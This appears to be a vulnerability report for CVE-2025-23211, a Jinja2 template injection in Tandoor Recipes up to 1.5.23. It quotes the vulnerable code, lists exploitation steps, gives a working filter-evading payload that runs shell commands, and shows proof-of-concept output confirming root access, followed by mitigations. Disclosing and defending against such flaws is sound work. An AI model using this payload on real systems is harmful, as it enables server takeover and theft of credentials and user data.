# CVE-2025-23211 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-23211
- **Vulnerability Type**: Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE)
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **Affected Software**: Tandoor Recipes <= 1.5.23
- **Fixed Version**: 1.5.24
- **CVSS Score**: 9.9 (Critical)

## Vulnerability Description

Tandoor Recipes contains a Jinja2 Server-Side Template Injection vulnerability in the `render_instructions` function (`cookbook/helper/template_helper.py`). User-provided recipe step instructions are passed directly to Jinja2's `Template()` class without proper sanitization, allowing authenticated users to inject malicious Jinja2 expressions that execute arbitrary Python code on the server.

## Affected Code

```python
# cookbook/helper/template_helper.py (Line 91-93)
try:
    template = Template(instructions)  # User input directly passed to Template
    instructions = template.render(ingredients=ingredients, scale=scale)
```

## Exploitation

1. Authenticate to the application
2. Create or join a Space
3. Create a new recipe with a malicious SSTI payload in the step instructions
4. View the recipe via the API to trigger template rendering

### Payload Example

```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('whoami',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
```

This payload uses hex-encoded underscores (`\x5f`) to bypass markdown processing.

## Impact

- **Remote Code Execution**: Any authenticated user can execute arbitrary system commands
- **Root Privilege**: Default Docker deployment runs as root, granting full system access
- **Data Compromise**: Attackers can access all data including database credentials, secrets, and user data
- **System Takeover**: Complete compromise of the container and potential container escape

## Proof of Concept Results

```
[*] Target: http://127.0.0.1:9080
[*] Testing CVE-2025-23211 - Jinja2 SSTI RCE
[*] Attempting login with admin...
[+] Login successful
[*] Creating space...
[+] Space created
[*] Creating recipe with SSTI payload (command: whoami)...
[+] Recipe created with ID: 3
[*] Viewing recipe to trigger SSTI...
[+] VULNERABILITY CONFIRMED!
[+] Command output: root
[+] Running as ROOT - Critical privilege level!
```

## Mitigation

1. Upgrade to Tandoor Recipes version 1.5.24 or later
2. Implement proper input validation and sanitization
3. Use Jinja2's sandbox environment for template rendering
4. Run containers with non-root user privileges

## References

- [GitHub Security Advisory](https://github.com/TandoorRecipes/recipes/security/advisories/GHSA-r6rj-h75w-vj8v)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-23211)
- [Patch Commit](https://github.com/TandoorRecipes/recipes/commit/e6087d5129cc9d0c24278948872377e66c2a2c20)
